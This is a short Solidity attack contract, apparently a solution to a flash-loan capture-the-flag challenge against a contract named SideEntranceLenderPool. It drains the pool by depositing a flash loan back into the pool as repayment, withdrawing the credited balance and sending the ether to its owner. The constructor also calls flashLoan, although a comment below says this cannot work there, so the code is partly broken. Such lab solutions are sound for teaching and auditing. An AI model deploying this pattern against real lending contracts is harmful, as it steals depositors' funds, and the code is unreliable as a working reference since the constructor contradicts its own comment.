pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract Attack2 is IFlashLoanEtherReceiver{

    SideEntranceLenderPool pool;
    address payable owner;

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    constructor (address payable poolAddress) public {
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
        pool.flashLoan(address(pool).balance);
    }

    // can't be done in constructor? why?
    // because there's no code deployed yet. So the call to "execute" will fail.
    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        owner.send(address(this).balance);
    }

    receive() external payable {}
}
